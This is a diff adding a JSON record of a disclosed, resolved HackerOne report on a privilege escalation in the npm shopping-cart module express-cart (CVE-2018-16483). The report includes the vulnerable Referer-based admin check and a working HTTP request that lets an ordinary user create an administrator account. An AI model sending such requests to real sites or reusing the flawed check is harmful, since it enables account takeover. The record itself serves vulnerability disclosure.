@@ -1,0 +1,138 @@
+{
+  "id": 343626,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDM2MjY=",
+  "url": "https://hackerone.com/reports/343626",
+  "title": "Privilege escalation allows any user to add an administrator",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-26T20:55:17.826Z",
+  "submitted_at": "2018-04-26T20:55:17.826Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "patrickrbc",
+    "url": "/patrickrbc",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/z93gc9obcr6jntighku2fjxm1nxj/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-16483"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-07-12T07:57:47.724Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-06-12T07:57:34.819Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report privilege escalation in the npm module express-cart.\n\nIt allows a normal user to add another user with administrator privileges.\n\n# Module\n\n**module name:** express-cart\n**version:** 1.1.5\n**npm page:** `https://www.npmjs.com/package/express-cart`\n\n## Module Description\n\nexpressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.\n\n## Module Stats\n\n[10] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nA deficiency in the access control allows normal users from expressCart to add new users to the application. This behavior by itself might be considered a privilege escalation. However, it was also possible to add the user as administrator.\n\n## Steps To Reproduce:\n\nFirstly, I noticed that all the endpoints located in the *user.js* file are not being restricted by the *common.restrict* middleware, as the other admin routes do.  Also, the endpoint */admin/user/insert* does not check if the user is admin before adding a new user, which I guess it would be a unlikely behavior.\n\nThe following code is used to check if it is the first time creating a user:\n\n```\n// set the account to admin if using the setup form. Eg: First user account\nlet urlParts = url.parse(req.header('Referer'));\n\nlet isAdmin = false;\nif(urlParts.path === '/admin/setup'){\n  isAdmin = true;\n}\n```\n\nAs you can see in the above snippet, if you send a request with a Referer containing the string */admin/setup* the user added will be considered an admin. For example:\n\n```\nPOST /admin/user/insert HTTP/1.1\nHost: localhost:1111\nReferer: http://localhost:1111/admin/setup\nContent-Type: application/x-www-form-urlencoded\nCookie: connect.sid=[NORMAL_USER_COOKIE]\n\nusersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nThis vulnerability would allow any registered user to create another user with administrator privileges and takeover the application.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-07-12T07:57:34.934Z",
+  "allow_singular_disclosure_after": -246957986.74124804,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "omarelfarsaoui",
+    "bl4de",
+    "patrickrbc",
+    "yasar",
+    "cryptographer",
+    "sh3r1",
+    "0x08",
+    "md_nazim",
+    "satbir",
+    "ronibdroy",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10291,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "express-cart",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
